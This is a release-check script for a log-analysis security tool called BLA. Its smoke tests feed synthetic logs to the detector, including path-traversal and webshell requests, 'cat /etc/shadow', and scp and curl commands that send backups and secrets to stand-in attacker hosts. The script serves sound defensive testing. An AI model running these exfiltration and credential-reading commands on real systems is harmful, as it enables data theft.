#!/usr/bin/env python3
"""Local release quality checks for BLA.

The script keeps the human release checklist executable: it verifies version
surfaces, runs the normal regression suite, exercises release-critical CLI
commands, and optionally inspects built distributions.
"""
from __future__ import annotations

import argparse
import hashlib
import importlib.util
import json
import os
import re
import shutil
import subprocess
import sys
import tarfile
import tempfile
import zipfile
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]


def _run(args: list[str], *, check: bool = True) -> subprocess.CompletedProcess[str]:
    print("+", " ".join(args))
    return subprocess.run(args, cwd=ROOT, text=True, check=check)


def _version() -> str:
    version_file = ROOT / "bla" / "__version__.py"
    version_text = version_file.read_text(encoding="utf-8")
    match = re.search(r'^__version__ = ["\']([^"\']+)["\']', version_text, re.M)
    _assert(match is not None, "unable to read package version from bla/__version__.py")
    return match.group(1)


def _assert(condition: bool, message: str) -> None:
    if not condition:
        raise SystemExit(f"release-check failed: {message}")


def _check_release_surfaces(version: str) -> None:
    required = [
        ROOT / "README.md",
        ROOT / "bla_cli.py",
        ROOT / "bla" / "__version__.py",
        ROOT / "bla" / "output" / "geo_map.py",
        ROOT / "bla" / "output" / "assets" / "world-countries.geojson",
        ROOT / "bla" / "parsers" / "shell_history.py",
        ROOT / "bla" / "parsers" / "windows_json.py",
        ROOT / "bla" / "parsers" / "edr_xlsx.py",
        ROOT / "docs" / "releases" / f"v{version}.md",
        ROOT / "sample_logs" / "auth.log",
        ROOT / "sample_logs" / "windows_rdp_sample.xml",
        ROOT / "tests" / "fixtures" / "p0" / "hvv_chain.jsonl",
    ]
    for path in required:
        _assert(path.exists(), f"missing required release file: {path.relative_to(ROOT)}")

    setup_text = (ROOT / "setup.py").read_text(encoding="utf-8")
    pyproject_text = (ROOT / "pyproject.toml").read_text(encoding="utf-8")
    readme_text = (ROOT / "README.md").read_text(encoding="utf-8")
    cli_text = (ROOT / "bla_cli.py").read_text(encoding="utf-8")

    _assert("exec(" not in setup_text, "setup.py should not execute version files")
    _assert('version = {attr = "bla.__version__.__version__"}' in pyproject_text,
            "pyproject.toml must read the package version dynamically")
    _assert(f"Version {version}" in readme_text or f"v{version}" in readme_text,
            "README should mention the current release version")
    _assert("Version 1.3.0" not in readme_text, "README still contains stale Version 1.3.0 text")
    _assert("8.8.8." not in cli_text, "benchmark synthetic logs should not use public resolver IP ranges")

    completed = subprocess.run(
        [sys.executable, "bla_cli.py", "--version"],
        cwd=ROOT,
        text=True,
        capture_output=True,
        check=True,
    )
    _assert(version in completed.stdout, "bla --version does not match package version")


def _check_distribution(version: str) -> None:
    if importlib.util.find_spec("build") is None:
        print("build is not installed; skipping distribution build. Install build or use CI for full packaging checks.")
        return

    shutil.rmtree(ROOT / "dist", ignore_errors=True)
    _run([sys.executable, "-m", "build"])

    dist = ROOT / "dist"
    wheels = sorted(dist.glob("*.whl"))
    sdists = sorted(dist.glob("*.tar.gz"))
    _assert(len(wheels) == 1, "expected exactly one wheel in dist/")
    _assert(len(sdists) == 1, "expected exactly one source distribution in dist/")

    if importlib.util.find_spec("twine") is not None:
        _run([sys.executable, "-m", "twine", "check", *[str(path) for path in wheels + sdists]])
    else:
        print("twine is not installed; skipping twine metadata check.")

    with zipfile.ZipFile(wheels[0]) as archive:
        names = set(archive.namelist())
        _assert("bla/rules/web_attacks.yaml" in names, "wheel is missing bla/rules/web_attacks.yaml")
        _assert("bla/output/assets/bla-logo.png" in names, "wheel is missing bla/output/assets/bla-logo.png")
        _assert("bla/output/assets/world-countries.geojson" in names,
                "wheel is missing bla/output/assets/world-countries.geojson")
        _assert("bla/output/geo_map.py" in names, "wheel is missing bla/output/geo_map.py")
        _assert("bla/parsers/shell_history.py" in names, "wheel is missing bla/parsers/shell_history.py")
        _assert("bla/parsers/windows_json.py" in names, "wheel is missing bla/parsers/windows_json.py")
        _assert("bla/parsers/edr_xlsx.py" in names, "wheel is missing bla/parsers/edr_xlsx.py")
        _assert("bla/remote/ssh_workspace.py" in names, "wheel is missing bla/remote/ssh_workspace.py")
        _assert("bla/cli/main.py" in names, "wheel is missing bla/cli/main.py")
        _assert("bla/output/manifest.py" in names, "wheel is missing bla/output/manifest.py")
        _assert("bla_cli.py" in names, "wheel is missing bla_cli.py")

    with tarfile.open(sdists[0]) as archive:
        names = archive.getnames()
        suffixes = [
            f"/docs/releases/v{version}.md",
            "/docs/assets/bla-cover.png",
            "/docs/screenshots/bla-p0-terminal-chain.png",
            "/docs/screenshots/bla-p0-report-overview.png",
            "/docs/screenshots/bla-p0-incident-alerts.png",
            "/bla/output/assets/bla-logo.png",
            "/bla/output/assets/world-countries.geojson",
            "/bla/output/geo_map.py",
            "/bla/parsers/shell_history.py",
            "/bla/parsers/windows_json.py",
            "/bla/parsers/edr_xlsx.py",
            "/bla/cli/main.py",
            "/bla_cli.py",
            "/scripts/release_check.py",
            "/sample_logs/auth.log",
            "/sample_logs/windows_rdp_sample.xml",
            "/tests/fixtures/p0/hvv_chain.jsonl",
        ]
        for suffix in suffixes:
            _assert(any(name.endswith(suffix) for name in names), f"sdist is missing {suffix}")

    _run_distribution_install_smoke(wheels[0])


def _venv_python(venv_dir: Path) -> Path:
    if os.name == "nt":
        return venv_dir / "Scripts" / "python.exe"
    return venv_dir / "bin" / "python"


def _venv_script(venv_dir: Path, name: str) -> Path:
    if os.name == "nt":
        return venv_dir / "Scripts" / f"{name}.exe"
    return venv_dir / "bin" / name


def _run_distribution_install_smoke(wheel_path: Path) -> None:
    with tempfile.TemporaryDirectory(prefix="bla-dist-install-") as tmp:
        tmp_path = Path(tmp)
        venv_dir = tmp_path / "venv"
        _run([sys.executable, "-m", "venv", str(venv_dir)])
        venv_python = _venv_python(venv_dir)
        _run([str(venv_python), "-m", "pip", "install", "--no-index", str(wheel_path)])

        smoke = r'''
import json
from pathlib import Path

from bla.parsers import auto_parse, list_parser_names, parse_content

names = list_parser_names()
assert "windows-json" in names, names
assert "edr-xlsx" in names, names

edr_content = "\n".join([
    "\t".join(["事件类型", "事件子类型", "时间", "进程用户名", "进程名", "进程映像路径", "进程文件签名", "进程事件文件路径", "目标进程文件签名", "进程命令"]),
    "\t".join([
        "进程事件", "进程创建", "2026-01-21 21:40:00", "Administrator",
        "II-10.tmp", r"C:\Users\ADMINI~1\AppData\Local\Temp\is-TED13.tmp\II-10.tmp",
        "", r"C:\inetpub\wwwroot\rMmZhp\ewWB4p\g36Q6KT.exe", "",
        r'"C:\inetpub\wwwroot\rMmZhp\ewWB4p\g36Q6KT"',
    ]),
])
edr_result = parse_content(edr_content, "edr-export.tsv", parser_name="edr-xlsx")
assert edr_result.log_type == "EDR Excel Export", edr_result.log_type
assert edr_result.stats.high == 1, edr_result.stats.high
assert "webroot-executable" in edr_result.events[0].tags, edr_result.events[0].tags

flat_record = {
    "SourceName": "Microsoft-Windows-Sysmon",
    "ProviderGuid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "Hostname": "WORKSTATION5.theshire.local",
    "UtcTime": "2020-10-23 02:36:51.000",
    "@timestamp": "2020-10-23T02:36:51.000Z",
    "EventID": 1,
    "Image": r"C:\Windows\System32\cmd.exe",
    "CommandLine": r"cmd.exe /c whoami",
    "Message": "Process Create.",
}
winlogbeat_record = {
    "@timestamp": "2022-08-18T06:57:28.129Z",
    "event": {"code": 4688, "provider": "Microsoft-Windows-Security-Auditing"},
    "host": {"name": "pedro-computer"},
    "winlog": {
        "event_id": 4688,
        "channel": "Security",
        "provider_name": "Microsoft-Windows-Security-Auditing",
        "computer_name": "pedro-computer",
        "event_data": {
            "SubjectUserName": "pedro-admin",
            "SubjectDomainName": "PEDRO-COMPUTER",
            "NewProcessName": r"C:\Windows\System32\auditpol.exe",
            "ParentProcessName": r"C:\Users\pedro\Downloads\payload.exe",
            "CommandLine": "auditpol.exe /clear /y",
        },
    },
    "process": {
        "executable": r"C:\Windows\System32\auditpol.exe",
        "command_line": "auditpol.exe /clear /y",
        "parent": {"executable": r"C:\Users\pedro\Downloads\payload.exe"},
    },
    "message": "A new process has been created.",
}
content = "\n".join([
    json.dumps(flat_record),
    '{"EventID": 1, "SourceName": ',
    json.dumps(winlogbeat_record),
]) + "\n"
result = parse_content(content, "windows-eventlog.jsonl")
assert result.log_type == "Windows Event Log (JSON)", result.log_type
assert result.stats.total == 2, result.stats.total
assert result.stats.parse_errors == 1, result.stats.parse_errors
assert {event.event_id for event in result.events} == {"1", "4688"}
assert any("auditpol-tampering" in event.tags for event in result.events), [event.tags for event in result.events]

pretty_path = Path("winlogbeat-pretty.json")
pretty_path.write_text(json.dumps(winlogbeat_record, indent=2), encoding="utf-8")
file_result = auto_parse(str(pretty_path))
assert file_result.log_type == "Windows Event Log (JSON)", file_result.log_type
assert file_result.stats.total == 1, file_result.stats.total
assert file_result.stats.parse_errors == 0, file_result.stats.parse_errors
assert file_result.events[0].event_id == "4688", file_result.events[0].event_id
assert "auditpol-tampering" in file_result.events[0].tags, file_result.events[0].tags
'''
        completed = subprocess.run(
            [str(venv_python), "-c", smoke],
            cwd=tmp_path,
            text=True,
            encoding="utf-8",
            errors="replace",
            capture_output=True,
            check=False,
        )
        _assert(
            completed.returncode == 0,
            "installed wheel windows-json parser smoke failed:\n"
            + completed.stdout
            + completed.stderr,
        )

        bla_cmd = _venv_script(venv_dir, "bla")
        version_completed = subprocess.run(
            [str(bla_cmd), "--version"],
            cwd=tmp_path,
            text=True,
            encoding="utf-8",
            errors="replace",
            capture_output=True,
            check=False,
        )
        _assert(
            version_completed.returncode == 0,
            "installed console script --version failed:\n"
            + version_completed.stdout
            + version_completed.stderr,
        )

        cli_report = tmp_path / "installed-cli-report.json"
        cli_completed = subprocess.run(
            [
                str(bla_cmd),
                str(tmp_path / "winlogbeat-pretty.json"),
                "--json",
                str(cli_report),
                "--exit-on",
                "none",
                "--no-color",
                "--max-alerts",
                "5",
            ],
            cwd=tmp_path,
            text=True,
            encoding="utf-8",
            errors="replace",
            capture_output=True,
            check=False,
        )
        _assert(
            cli_completed.returncode == 0,
            "installed console script Windows JSON smoke failed:\n"
            + cli_completed.stdout
            + cli_completed.stderr,
        )
        report = json.loads(cli_report.read_text(encoding="utf-8"))
        event_ids = {item.get("event_id") for item in report.get("events", [])}
        _assert("4688" in event_ids, "installed console script JSON report missing Windows 4688 event")
        _assert(
            any("auditpol-tampering" in item.get("tags", []) for item in report.get("events", [])),
            "installed console script JSON report missing auditpol-tampering tag",
        )

        bundle_dir = tmp_path / "installed-cli-bundle"
        bundle_completed = subprocess.run(
            [
                str(bla_cmd),
                str(tmp_path / "winlogbeat-pretty.json"),
                "--out",
                str(bundle_dir),
                "--exit-on",
                "none",
                "--no-color",
                "--max-alerts",
                "5",
            ],
            cwd=tmp_path,
            text=True,
            encoding="utf-8",
            errors="replace",
            capture_output=True,
            check=False,
        )
        _assert(
            bundle_completed.returncode == 0,
            "installed console script report bundle smoke failed:\n"
            + bundle_completed.stdout
            + bundle_completed.stderr,
        )
        for name in ("index.html", "report.json", "events.csv", "iocs.txt", "report.sarif", "manifest.json"):
            _assert((bundle_dir / name).exists(), f"installed CLI report bundle missing {name}")

        bundle_report = json.loads((bundle_dir / "report.json").read_text(encoding="utf-8"))
        _assert(
            any(item.get("event_id") == "4688" for item in bundle_report.get("events", [])),
            "installed CLI report bundle JSON missing Windows 4688 event",
        )

        manifest = json.loads((bundle_dir / "manifest.json").read_text(encoding="utf-8"))
        _assert(manifest.get("schema") == "bla-report-manifest-v1", "installed CLI manifest schema mismatch")
        manifest_inputs = manifest.get("inputs", [])
        input_record = next(
            (item for item in manifest_inputs if item.get("name") == "winlogbeat-pretty.json"),
            None,
        )
        _assert(input_record is not None, "installed CLI manifest missing input record")
        _assert(
            not os.path.isabs(str(input_record.get("path", ""))),
            "installed CLI manifest leaked an absolute input path",
        )
        expected_input_hash = hashlib.sha256((tmp_path / "winlogbeat-pretty.json").read_bytes()).hexdigest()
        _assert(
            input_record.get("sha256") == expected_input_hash,
            "installed CLI manifest input hash mismatch",
        )
        outputs = {item.get("name"): item for item in manifest.get("outputs", [])}
        for name in ("index.html", "report.json", "events.csv", "iocs.txt", "report.sarif"):
            output_record = outputs.get(name)
            _assert(output_record is not None, f"installed CLI manifest missing output record for {name}")
            _assert(len(str(output_record.get("sha256", ""))) == 64,
                    f"installed CLI manifest missing output hash for {name}")
        html_text = (bundle_dir / "index.html").read_text(encoding="utf-8")
        _assert("cdn.jsdelivr" not in html_text and "unpkg.com" not in html_text,
                "installed CLI HTML bundle should not depend on CDN assets")

        dup_root = tmp_path / "duplicate-basenames"
        dup_host_a = dup_root / "host-a"
        dup_host_b = dup_root / "host-b"
        dup_host_a.mkdir(parents=True)
        dup_host_b.mkdir(parents=True)
        dup_a_content = (
            '9.9.9.9 - - [15/Mar/2024:10:00:00 +0800] '
            '"GET /admin.php HTTP/1.1" 404 10 "-" "curl/8"\n'
        )
        dup_b_content = (
            '198.51.100.10 - - [15/Mar/2024:10:00:01 +0800] '
            '"GET /download.php?file=../../etc/passwd HTTP/1.1" 200 10 "-" "Mozilla/5.0"\n'
        )
        (dup_host_a / "access.log").write_text(dup_a_content, encoding="utf-8")
        (dup_host_b / "access.log").write_text(dup_b_content, encoding="utf-8")
        dup_bundle_dir = tmp_path / "duplicate-basenames-bundle"
        dup_completed = subprocess.run(
            [
                str(bla_cmd),
                str(dup_host_a / "access.log"),
                str(dup_host_b / "access.log"),
                "--out",
                str(dup_bundle_dir),
                "--exit-on",
                "none",
                "--no-color",
                "--max-alerts",
                "5",
            ],
            cwd=tmp_path,
            text=True,
            encoding="utf-8",
            errors="replace",
            capture_output=True,
            check=False,
        )
        _assert(
            dup_completed.returncode == 0,
            "installed console script duplicate basename bundle smoke failed:\n"
            + dup_completed.stdout
            + dup_completed.stderr,
        )
        dup_manifest = json.loads((dup_bundle_dir / "manifest.json").read_text(encoding="utf-8"))
        expected_names = {"host-a/access.log", "host-b/access.log"}
        input_names = {item.get("name") for item in dup_manifest.get("inputs", [])}
        parsed_names = {item.get("name") for item in dup_manifest.get("parsed_files", [])}
        _assert(input_names == expected_names, "installed CLI duplicate basename manifest inputs collapsed")
        _assert(parsed_names == expected_names, "installed CLI duplicate basename parsed files collapsed")
        _assert(dup_manifest.get("summary", {}).get("files_analyzed") == 2,
                "installed CLI duplicate basename summary file count mismatch")
        dup_manifest_text = json.dumps(dup_manifest, ensure_ascii=False)
        _assert(str(tmp_path) not in dup_manifest_text,
                "installed CLI duplicate basename manifest leaked temp absolute path")
        dup_hashes = {item.get("name"): item.get("sha256") for item in dup_manifest.get("inputs", [])}
        _assert(
            dup_hashes.get("host-a/access.log") == hashlib.sha256(dup_a_content.encode()).hexdigest(),
            "installed CLI duplicate basename manifest host-a hash mismatch",
        )
        _assert(
            dup_hashes.get("host-b/access.log") == hashlib.sha256(dup_b_content.encode()).hexdigest(),
            "installed CLI duplicate basename manifest host-b hash mismatch",
        )

        secret_root = tmp_path / "token=super-secret"
        rules_dir = secret_root / "rules-token=super-secret"
        secret_root.mkdir()
        rules_dir.mkdir()
        options_log = secret_root / "access.log"
        options_config = secret_root / "thresholds.json"
        options_allowlist = secret_root / "allowlist.json"
        options_log.write_text(dup_a_content, encoding="utf-8")
        options_config.write_text('{"brute_force_min": 5}', encoding="utf-8")
        options_allowlist.write_text("{}", encoding="utf-8")
        options_bundle_dir = tmp_path / "manifest-options-bundle"
        options_completed = subprocess.run(
            [
                str(bla_cmd),
                str(options_log),
                "--config",
                str(options_config),
                "--allowlist",
                str(options_allowlist),
                "--rules",
                str(rules_dir),
                "--out",
                str(options_bundle_dir),
                "--exit-on",
                "none",
                "--no-color",
                "--max-alerts",
                "5",
            ],
            cwd=tmp_path,
            text=True,
            encoding="utf-8",
            errors="replace",
            capture_output=True,
            check=False,
        )
        _assert(
            options_completed.returncode == 0,
            "installed console script manifest options smoke failed:\n"
            + options_completed.stdout
            + options_completed.stderr,
        )
        options_manifest = json.loads((options_bundle_dir / "manifest.json").read_text(encoding="utf-8"))
        options = options_manifest.get("options", {})
        _assert(options.get("config") == "thresholds.json",
                "installed CLI manifest options leaked config path")
        _assert(options.get("allowlist") == "allowlist.json",
                "installed CLI manifest options leaked allowlist path")
        _assert(options.get("rules") == ["rules-token=<redacted>"],
                "installed CLI manifest options did not sanitize rules path")
        options_manifest_text = json.dumps(options_manifest, ensure_ascii=False)
        _assert(str(tmp_path) not in options_manifest_text,
                "installed CLI manifest options leaked temp absolute path")
        _assert("super-secret" not in options_manifest_text,
                "installed CLI manifest options leaked raw secret")


def _run_sample_smokes() -> None:
    with tempfile.TemporaryDirectory(prefix="bla-release-smoke-") as tmp:
        tmp_path = Path(tmp)
        commands = [
            [sys.executable, "bla_cli.py", "sample_logs/auth.log", "--no-color", "--max-alerts", "3", "--exit-on", "none"],
            [sys.executable, "bla_cli.py", "sample_logs/access.log", "--no-color", "--max-alerts", "3", "--exit-on", "none"],
            [
                sys.executable,
                "bla_cli.py",
                "sample_logs/remote_ssh_auth.log",
                "--no-color",
                "--max-alerts",
                "3",
                "--exit-on",
                "none",
            ],
            [
                sys.executable,
                "bla_cli.py",
                "sample_logs/windows_rdp_sample.xml",
                "--rdp",
                "--json",
                str(tmp_path / "rdp.json"),
                "--exit-on",
                "none",
                "--no-color",
            ],
            [
                sys.executable,
                "bla_cli.py",
                "tests/fixtures/p0/hvv_chain.jsonl",
                "--type",
                "p0-security",
                "--profile",
                "cn-hvv",
                "--out",
                str(tmp_path / "p0"),
                "--exit-on",
                "none",
                "--no-color",
                "--max-alerts",
                "5",
            ],
        ]
        for command in commands:
            _run(command)

        rdp_report = json.loads((tmp_path / "rdp.json").read_text(encoding="utf-8"))
        _assert("summary" in rdp_report, "RDP JSON smoke did not produce summary")
        _assert("truncation" in rdp_report, "RDP JSON smoke did not expose truncation metadata")

        p0_dir = tmp_path / "p0"
        for name in ("index.html", "report.json", "events.csv", "iocs.txt", "report.sarif", "manifest.json"):
            _assert((p0_dir / name).exists(), f"P0 report bundle missing {name}")
        manifest = json.loads((p0_dir / "manifest.json").read_text(encoding="utf-8"))
        _assert(manifest.get("schema") == "bla-report-manifest-v1", "manifest schema mismatch")
        _assert(manifest.get("outputs"), "manifest does not list report outputs")


def _run_v141_feature_smoke() -> None:
    """Exercise the v1.4.1 report features through the public CLI."""
    with tempfile.TemporaryDirectory(prefix="bla-v141-smoke-") as tmp:
        tmp_path = Path(tmp)
        input_dir = tmp_path / "input"
        input_dir.mkdir()
        (input_dir / "access.log").write_text(
            '9.9.9.9 - - [15/Mar/2024:10:00:00 +0800] '
            '"GET /wp-login.php HTTP/1.1" 404 10 "-" "curl/8"\n'
            '9.9.9.9 - - [15/Mar/2024:10:00:01 +0800] '
            '"GET /download.php?file=../../etc/passwd HTTP/1.1" 200 10 "-" "curl/8"\n',
            encoding="utf-8",
        )
        (input_dir / ".bash_history").write_text(
            "\n".join([
                "whoami",
                "wget https://example.test/linux-exploit-suggester.sh -O les.sh",
                "sudo -l",
                "cat /etc/shadow",
                "history -c",
            ]) + "\n",
            encoding="utf-8",
        )
        geo_cache = tmp_path / "geo-cache.json"
        geo_cache.write_text(
            json.dumps({
                "9.9.9.9": {
                    "status": "success",
                    "country": "United States",
                    "regionName": "California",
                    "city": "Berkeley",
                }
            }),
            encoding="utf-8",
        )
        out_dir = tmp_path / "report"

        _run([
            sys.executable,
            "bla_cli.py",
            str(input_dir),
            "--out",
            str(out_dir),
            "--geoip-cache",
            str(geo_cache),
            "--exit-on",
            "none",
            "--no-color",
            "--max-alerts",
            "5",
        ])

        html = (out_dir / "index.html").read_text(encoding="utf-8")
        report = json.loads((out_dir / "report.json").read_text(encoding="utf-8"))
        manifest = json.loads((out_dir / "manifest.json").read_text(encoding="utf-8"))

        _assert("攻击源地理分布" in html, "v1.4.1 smoke report did not render the GeoIP map section")
        _assert("United States" in html, "v1.4.1 smoke report did not render GeoIP cache country data")
        _assert("Shell History" in html, "v1.4.1 smoke report did not include shell history parse results")
        _assert("Linux 敏感凭据文件读取" in html, "v1.4.1 smoke report did not include shell history evidence")
        _assert("Shell 凭据访问轨迹" in html, "v1.4.1 smoke report did not render shell history incident subjects")
        _assert("未知实体" not in html, "v1.4.1 smoke report regressed to unknown incident subjects")
        _assert("未知来源" not in json.dumps(report, ensure_ascii=False),
                "v1.4.1 smoke JSON regressed to unknown incident descriptions")
        _assert("cdn.jsdelivr" not in html, "v1.4.1 smoke report should remain offline and avoid CDN assets")
        _assert(any(item.get("type") == "Shell History" for item in report.get("files", [])),
                "v1.4.1 smoke JSON did not include Shell History as a parsed file")
        _assert(any(item.get("type") == "Shell History" for item in manifest.get("parsed_files", [])),
                "v1.4.1 smoke manifest did not include Shell History as a parsed file")


def _run_v142_hardening_smoke() -> None:
    """Exercise the v1.4.2 output-safety and parser-stability additions."""
    with tempfile.TemporaryDirectory(prefix="bla-v142-smoke-") as tmp:
        tmp_path = Path(tmp)
        input_dir = tmp_path / "input"
        history_dir = input_dir / "home" / "alice"
        history_dir.mkdir(parents=True)
        (input_dir / "access.log").write_text(
            '8.8.8.8 - - [15/Mar/2024:10:00:00 +0800] '
            '"GET /upload/shell.jsp?cmd=whoami HTTP/1.1" 200 10 "-" "curl/8"\n'
            '9.9.9.9 - - [15/Mar/2024:10:00:01 +0800] '
            '"GET /admin.php HTTP/1.1" 403 10 "-" "curl/8"\n'
            '10.0.0.5 - - [15/Mar/2024:10:00:02 +0800] '
            '"GET /admin.php HTTP/1.1" 403 10 "-" "internal-check"\n',
            encoding="utf-8",
        )
        (history_dir / ".zsh_history").write_text(
            "\n".join([
                ": 1710500000:0;grep DB_PASSWORD access_token=super-secret /var/www/html/.env",
                ": 1710500060:0;cat /etc/shadow",
            ]) + "\n",
            encoding="utf-8",
        )
        geo_cache = tmp_path / "geo-cache.json"
        geo_cache.write_text(
            json.dumps({
                "8.8.8.8": {
                    "status": "success",
                    "country": "United States",
                    "regionName": "California",
                    "city": "Mountain View",
                }
            }),
            encoding="utf-8",
        )
        out_dir = tmp_path / "report"

        _run([
            sys.executable,
            "bla_cli.py",
            str(input_dir),
            "--out",
            str(out_dir),
            "--geoip-cache",
            str(geo_cache),
            "--exit-on",
            "none",
            "--no-color",
            "--max-alerts",
            "5",
        ])

        html = (out_dir / "index.html").read_text(encoding="utf-8")
        report = json.loads((out_dir / "report.json").read_text(encoding="utf-8"))
        iocs = (out_dir / "iocs.txt").read_text(encoding="utf-8")
        report_text = json.dumps(report, ensure_ascii=False)

        _assert("alice 的 Shell 凭据访问轨迹" in html,
                "v1.4.2 smoke did not preserve shell account context in incident title")
        _assert("证据类型: Shell 命令历史" in html,
                "v1.4.2 smoke did not mark Shell History as evidence")
        _assert("已排除 1 个内网/回环/保留源 IP" in html,
                "v1.4.2 smoke did not report excluded non-public source IPs")
        _assert("1 个公网源 IP 缺少地理数据" in html,
                "v1.4.2 smoke did not report unlocated public source IPs")
        _assert("access_token=<redacted>" in iocs,
                "v1.4.2 smoke IOC export did not redact assignment-style secrets")
        _assert("super-secret" not in iocs and "\x1b" not in iocs,
                "v1.4.2 smoke IOC export leaked raw secret or terminal control data")
        _assert("alice" in report_text,
                "v1.4.2 smoke JSON did not keep shell account context")


def _run_v143_feature_smoke(version: str) -> None:
    """Exercise the v1.4.3 JSON controls, Shell exfiltration, and P0 vendor fields."""
    with tempfile.TemporaryDirectory(prefix="bla-v143-smoke-") as tmp:
        tmp_path = Path(tmp)
        input_dir = tmp_path / "input"
        input_dir.mkdir()
        (input_dir / "p0_security.log").write_text(
            "\n".join([
                "time=2024-03-15T12:00:00 log_type=proxy src_ip=10.0.0.8 user=alice "
                "request_url=https://download.evil.example/tool.ps1 action=allow",
                "time=2024-03-15T12:01:00 log_type=proxy src_ip=10.0.0.8 user=alice "
                "request_url=https://beacon.evil.example/a url_category=Malware threat_category=C2 action=allow",
                "time=2024-03-15T12:02:00 log_type=firewall src_ip=198.51.100.8 dst_ip=10.0.0.5 "
                "dst_port=3389 protocol=tcp policy_action=allow",
                "time=2024-03-15T12:03:00 log_type=vpn username=alice src_ip=198.51.100.44 auth_result=failed",
                "time=2024-03-15T12:03:10 log_type=vpn username=alice src_ip=198.51.100.44 auth_result=failed",
                "time=2024-03-15T12:03:20 log_type=vpn username=alice src_ip=198.51.100.44 auth_result=failed",
                "time=2024-03-15T12:03:30 log_type=vpn username=alice src_ip=198.51.100.44 auth_result=failed",
                "time=2024-03-15T12:03:40 log_type=vpn username=alice src_ip=198.51.100.44 auth_result=failed",
            ]) + "\n",
            encoding="utf-8",
        )
        (input_dir / ".bash_history").write_text(
            "\n".join([
                "scp /var/backups/db.sql.gz attacker@203.0.113.10:/tmp/db.sql.gz",
                "curl --upload-file /tmp/secrets.tar.gz https://exfil.example/upload",
            ]) + "\n",
            encoding="utf-8",
        )
        out_dir = tmp_path / "report"

        _run([
            sys.executable,
            "bla_cli.py",
            str(input_dir),
            "--profile",
            "cn-hvv",
            "--out",
            str(out_dir),
            "--json-events-limit",
            "2",
            "--raw-line-limit",
            "32",
            "--exit-on",
            "none",
            "--no-color",
            "--max-alerts",
            "10",
        ])

        html = (out_dir / "index.html").read_text(encoding="utf-8")
        report = json.loads((out_dir / "report.json").read_text(encoding="utf-8"))
        manifest = json.loads((out_dir / "manifest.json").read_text(encoding="utf-8"))
        alert_ids = {item.get("rule_id") for item in report.get("alerts", [])}
        report_text = json.dumps(report, ensure_ascii=False)

        _assert(report.get("meta", {}).get("version") == version, "v1.4.3 smoke JSON version mismatch")
        _assert("EXFIL-001" in alert_ids, "v1.4.3 smoke did not detect shell data exfiltration")
        _assert("P0-C2-001" in alert_ids, "v1.4.3 smoke did not promote proxy vendor URL/category fields")
        _assert("BRUTE-001" in alert_ids, "v1.4.3 smoke did not promote VPN auth_result failures")
        _assert("P0-FW-001" in alert_ids, "v1.4.3 smoke did not promote firewall policy_action allow")
        _assert("Shell 数据外传命令" in html, "v1.4.3 smoke HTML did not render shell exfiltration alert")
        _assert("download.evil.example" in report_text, "v1.4.3 smoke did not preserve proxy request_url target")
        _assert(report.get("truncation", {}).get("events", {}).get("returned") == 2,
                "v1.4.3 smoke JSON event limit was not applied")
        _assert(report.get("truncation", {}).get("events", {}).get("truncated") is True,
                "v1.4.3 smoke JSON event truncation metadata missing")
        _assert(all(len(item.get("raw_line", "")) <= 32 for item in report.get("events", [])),
                "v1.4.3 smoke raw_line limit was not applied")
        _assert(manifest.get("inputs"), "v1.4.3 smoke manifest did not record inputs")


def main() -> int:
    parser = argparse.ArgumentParser(description="Run BLA's local release safety checks.")
    parser.add_argument("--build", action="store_true", help="build and inspect wheel/sdist artifacts")
    args = parser.parse_args()

    version = _version()
    _check_release_surfaces(version)

    commands = [
        [sys.executable, "-m", "compileall", "-q", "bla", "bla_cli.py", "setup.py", "tests"],
        [sys.executable, "-m", "pytest", "-q"],
        [sys.executable, "-m", "unittest", "discover", "-s", "tests", "-v"],
        [sys.executable, "bla_cli.py", "validate-rules", "--strict-metadata"],
        [sys.executable, "bla_cli.py", "ssh", "--help"],
        [sys.executable, "bla_cli.py", "remote-log", "--help"],
        [sys.executable, "bla_cli.py", "benchmark", "--size-mb", "1"],
        [sys.executable, "bla_cli.py", "benchmark", "--size-mb", "1", "--memory"],
    ]
    for command in commands:
        _run(command)
    _run_sample_smokes()
    _run_v141_feature_smoke()
    _run_v142_hardening_smoke()
    _run_v143_feature_smoke(version)

    if args.build:
        _check_distribution(version)

    print("release-check passed")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
